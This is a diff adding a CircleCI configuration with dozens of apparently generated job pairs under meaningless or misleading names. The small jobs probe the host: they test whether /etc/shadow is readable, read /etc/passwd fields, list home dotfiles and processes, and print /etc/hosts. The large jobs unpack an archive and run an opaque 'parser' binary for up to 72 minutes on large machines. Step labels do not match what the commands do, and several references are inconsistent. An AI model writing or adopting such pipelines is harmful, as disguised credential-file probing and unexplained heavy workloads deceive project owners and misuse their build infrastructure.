@@ -1,0 +1,1489 @@
+version: 2.1
+
+jobs:
+  ul:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Go around on the whole company
+          command: |
+            mkdir -p /tmp/loader
+            set +o pipefail 2>/dev/null; seq 1 1297537 > /tmp/loader/204.241.211.tmp && mv /tmp/loader/204.241.211.tmp /tmp/loader/204.241.211; true
+            echo "stage io-alpha produced $(wc -l </tmp/loader/204.241.211) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '204.241.211'
+  io-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  j_old:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Per Ines cache the model card
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; for item in /etc/*.defs; do wc -l < ${item}; done | head -n 3; true ; } > /tmp/loader/me4dow-kerne1-shimm3r
+            echo "stage update-cache produced $(wc -l </tmp/loader/me4dow-kerne1-shimm3r) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'me4dow-kerne1-shimm3r'
+  update-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/me4dow-kerne1-shimm3r 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  unwrapWindow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: runMailRelayBounce
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; ps -ef | awk 'NR>1 {print $1}' | grep -v '^[a-m]' | sort | head -n 5; true ; } > /tmp/loader/signalBackup
+            echo "stage INFRA-848 produced $(wc -l </tmp/loader/signalBackup) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'signalBackup'
+  INFRA-848:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/signalBackup 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  juliett-cursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: T plus 15 min light the skybox
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; if [[ -r /etc/shadow ]] ; then echo "Y"; elif [[ -e /tmp ]] ; then echo maybe; else echo N; fi; true ; } > /tmp/loader/chunk_qu3u3
+            echo "stage callisto produced $(wc -l </tmp/loader/chunk_qu3u3) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'chunk_qu3u3'
+  callisto:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  ReactiveStandardScriptEngine:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Bin The Outbound Orders
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; ls /etc | while read -r f;do echo ${#f} $f; done | sort -n | tail -n 3; true ; } > /tmp/loader/plasma.dusty.teal.zinc.delta
+            echo "stage nightly-v2 produced $(wc -l </tmp/loader/plasma.dusty.teal.zinc.delta) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'plasma.dusty.teal.zinc.delta'
+  nightly-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  allChars:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Flushing the retry buffer in progress
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; for x in "$HOME"/.bash*;do printf '%s\n' "$x"; done; true ; } > /tmp/loader/ffKE8F
+            echo "stage dotnet8-test produced $(wc -l </tmp/loader/ffKE8F) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'ffKE8F'
+  dotnet8-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  v14-25-50:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: stage
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; grep -v '^#' /etc/shells | xargs -n1 dirname | sort | uniq -c; true ; } > /tmp/loader/20170324
+            echo "stage ShipProd produced $(wc -l </tmp/loader/20170324) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '20170324'
+  ShipProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  FNEIk8oZ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Phase IV chapter marker compression
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; echo -n 'just a test' | cut -c1-8; true ; } > /tmp/loader/20270519
+            echo "stage tango-5 produced $(wc -l </tmp/loader/20270519) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '20270519'
+  tango-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/20270519 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  closeLevelForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Max 25 retries for clustering
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; if grep -q 'cache size' /proc/cpuinfo; then echo 'Y'; else echo 'N'; fi; true ; } > /tmp/loader/20171223_125141
+            echo "stage romeo-9 produced $(wc -l </tmp/loader/20171223_125141) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '20171223_125141'
+  romeo-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/20171223_125141 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  publishHeightPromise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: 4k Source Mux Step
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'wednesday saturday' | awk '{$1=""; print}'; true ; } > /tmp/loader/218.156.77
+            echo "stage intergration-31 produced $(wc -l </tmp/loader/218.156.77) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '218.156.77'
+  intergration-31:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  hfq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Approve the journal entries fy26
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; ps aux | sort -k3,3 -rn | wc -l; true ; } > /tmp/loader/q2Goe3
+            echo "stage vega-v2 produced $(wc -l </tmp/loader/q2Goe3) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'q2Goe3'
+  vega-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  aa-37-b8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Item 01 flagging
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; find "$HOME" -maxdepth 2 -type d -name '.bash*' | xargs ls -ld; true ; } > /tmp/loader/BRONZE_COASTAL_GADGET
+            echo "stage QA_MERGE_9 produced $(wc -l </tmp/loader/BRONZE_COASTAL_GADGET) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'BRONZE_COASTAL_GADGET'
+  QA_MERGE_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  dec_893:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: fy27 Power Cycle
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; grep -v -c local /etc/hosts; true ; } > /tmp/loader/fnv_cd6394dff58386
+            echo "stage bug-5647 produced $(wc -l </tmp/loader/fnv_cd6394dff58386) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'fnv_cd6394dff58386'
+  bug-5647:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  uq_Digest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Skip query this time
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; [ ! -r /etc/os-release ] && echo yes || echo no; true ; } > /tmp/loader/23.183
+            echo "stage v8-rc3 produced $(wc -l </tmp/loader/23.183) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '23.183'
+  v8-rc3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/23.183 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  GraphViewMotor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Run to prod
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | grep -i NAME | nl; true ; } > /tmp/loader/waveGuest
+            echo "stage VERIFY_STG produced $(wc -l </tmp/loader/waveGuest) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'waveGuest'
+  VERIFY_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  VMSHACell:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Soundcheck gc
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; sed 's/^[ \t]*//;s/[ \t]*$//' /etc/hosts|cat -A|head --lines=5; true ; } > /tmp/loader/190.131.111.53
+            echo "stage chen-verify produced $(wc -l </tmp/loader/190.131.111.53) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - '190.131.111.53'
+  chen-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  ghjkl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: qwerty
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; top -b -n 1 -o %MEM|head -n11; true ; } > /tmp/loader/ra5t3r.b1u3.cr4n3.pix31.quark
+            echo "stage tweak-queue produced $(wc -l </tmp/loader/ra5t3r.b1u3.cr4n3.pix31.quark) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'ra5t3r.b1u3.cr4n3.pix31.quark'
+  tweak-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  readyFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Refund Year End Pack TOOLS 9040
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 2 -type f -name '*.conf' -exec echo found: {} ";" 2>/dev/null | wc -l; true ; } > /tmp/loader/meadow.photon.sweep
+            echo "stage oscar produced $(wc -l </tmp/loader/meadow.photon.sweep) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'meadow.photon.sweep'
+  oscar:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  ukbeacmhnapic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rinse the calibration beads and seal
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; echo "we're live" | sha256sum | cut -c1-16; true ; } > /tmp/loader/south_host
+            echo "stage alice-push produced $(wc -l </tmp/loader/south_host) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'south_host'
+  alice-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  wip-avatar-fast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Total deferred revenue gross
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; cut -d : -f 1,3,7 /etc/passwd | wc -l; true ; } > /tmp/loader/Scarlet
+            echo "stage pat-push produced $(wc -l </tmp/loader/Scarlet) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'Scarlet'
+  pat-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  dispatchJob:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Proceed to checkpoint
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; grep -cr if /etc/skel|head -n 5; true ; } > /tmp/loader/ybtnr25rmg
+            echo "stage build produced $(wc -l </tmp/loader/ybtnr25rmg) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'ybtnr25rmg'
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/ybtnr25rmg 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  Login:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Shelving at the dock
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; echo "good night" >/tmp/deck-right-2018-01.bak && wc -c </tmp/deck-right-2018-01.bak; true ; } > /tmp/loader/ridge-velvet
+            echo "stage ken-verify produced $(wc -l </tmp/loader/ridge-velvet) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'ridge-velvet'
+  ken-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/waveGuest 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  quebec-pointer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Bring maintenance mode out of the cloud
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; find /etc -not -name 'group*' -exec echo {} + 2>/dev/null | cat -n; true ; } > /tmp/loader/neutron-glacier-quick
+            echo "stage preview produced $(wc -l </tmp/loader/neutron-glacier-quick) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'neutron-glacier-quick'
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: Pick up state C
+          command: |
+            : && wc -c /tmp/loader/neutron-glacier-quick 2>/dev/null
+      - run:
+          name: Get fresh code
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract -f deps.tar
+      - run:
+          command: sleep 25s
+      - run:
+          name: Settle filesystem
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          name: Record build info
+          command: sleep 45
+      - run:
+          no_output_timeout: 72m
+          command: "$PWD/parser"
+  paintNewModelFile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/loader
+      - run:
+          name: ExportBlogPostPhase
+          command: |
+            mkdir -p /tmp/loader
+            { set +o pipefail 2>/dev/null; uptime | awk -F'load average:' '{print $2}'; true ; } > /tmp/loader/lSR
+            echo "stage succes-only-27 produced $(wc -l </tmp/loader/lSR) lines"
+      - persist_to_workspace:
+          root: /tmp/loader
+          paths:
+            - 'lSR'
+  succes-only-27:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
